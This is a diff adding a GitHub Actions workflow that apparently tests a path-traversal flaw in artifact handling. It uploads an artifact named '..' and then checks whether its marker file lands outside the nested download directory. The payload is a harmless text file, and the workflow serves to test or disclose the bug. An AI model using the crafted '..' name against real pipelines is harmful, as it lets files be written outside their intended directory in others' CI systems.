@@ -1,0 +1,51 @@
+name: actions artifact dotdot validation
+
+run-name: actions artifact dotdot validation ${{ github.run_id }}
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  validate-dotdot-artifact-name:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Prepare payload files
+        run: |
+          set -euo pipefail
+          rm -rf payload-dotdot payload-safe sandbox
+          mkdir -p payload-dotdot payload-safe sandbox/inner
+          printf 'dotdot-poc-%s\n' "$GITHUB_RUN_ID" > payload-dotdot/poc.txt
+          printf 'safe-%s\n' "$GITHUB_RUN_ID" > payload-safe/safe.txt
+
+      - name: Upload crafted dotdot artifact
+        uses: actions/upload-artifact@v7.0.1
+        with:
+          name: ..
+          path: payload-dotdot/poc.txt
+          retention-days: 1
+
+      - name: Upload second artifact to force multi-artifact mode
+        uses: actions/upload-artifact@v7.0.1
+        with:
+          name: safe-artifact
+          path: payload-safe/safe.txt
+          retention-days: 1
+
+      - name: Download all artifacts into a nested target directory
+        uses: actions/download-artifact@v8.0.1
+        with:
+          path: sandbox/inner
+
+      - name: Validate directory escape
+        run: |
+          set -euo pipefail
+          find sandbox -maxdepth 4 -type f -print -exec sed -n '1p' {} \;
+          test -f sandbox/poc.txt
+          test -f sandbox/inner/safe-artifact/safe.txt
